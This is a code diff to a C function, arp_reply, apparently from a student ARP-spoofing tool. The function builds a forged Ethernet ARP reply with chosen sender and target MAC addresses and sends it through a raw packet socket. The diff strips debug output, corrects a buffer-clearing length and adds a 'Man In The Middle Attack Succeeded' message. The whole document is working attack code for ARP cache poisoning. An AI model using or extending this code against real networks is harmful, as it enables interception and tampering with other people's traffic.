@@ -50,7 +50,6 @@ int arp_reply(char **av){
 	struct sockaddr_ll device;
 	unsigned char ether_frame[60];
 
-	printf("IP MAXPACKET = %d\n", IP_MAXPACKET);
 	printf("Initialization of the ARP reply\nCheck if the target IP (%s) is up, please wait ...\n", av[3]);
 	if (check_up_target(av[3]) != 0){
 		printf("Unknown host IP: %s\n", av[3]);
@@ -60,17 +59,12 @@ int arp_reply(char **av){
 	fill_arphdr(&arphdr, av);
 	fill_device(&device, arphdr.sender_mac);
 	frame_length = 6 + 6 + 2 + 18 + 28; // 18 = PADDIND && 28 = ARP_HDRLEN
-	ft_bzero(ether_frame, 59);
+	ft_bzero(ether_frame, 60);
 	memcpy(ether_frame, arphdr.target_mac, 6 * sizeof (uint8_t));
 	memcpy(ether_frame + 6, arphdr.sender_mac, 6 * sizeof (uint8_t));
-	for (int i = 0; i < MAC_ADDR_LEN; i++)
-		printf("%x.", arphdr.sender_mac[i]);
 	ether_frame[12] = ETH_P_ARP / 256;
 	ether_frame[13] = ETH_P_ARP % 256; // => ether_frame[12] = 08 / ether_frame[13] = 06 pour correspondre avec le ETH_P_ARP = 0x0806
-	printf("\n");
 	memcpy(ether_frame + 14, &arphdr, 28 * sizeof (uint8_t));
-	for (int i = 0; i < 60; i++)
-		printf("%02x/", ether_frame[i]);
 	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 	if(sock < 0){
 		perror("socket() failed");
@@ -82,5 +76,6 @@ int arp_reply(char **av){
 		return (-1);
 	}
 	close(sock);
+	printf("Man In The Middle Attack Succeeded\nProgram Exiting\n");
 	return (0);
 }
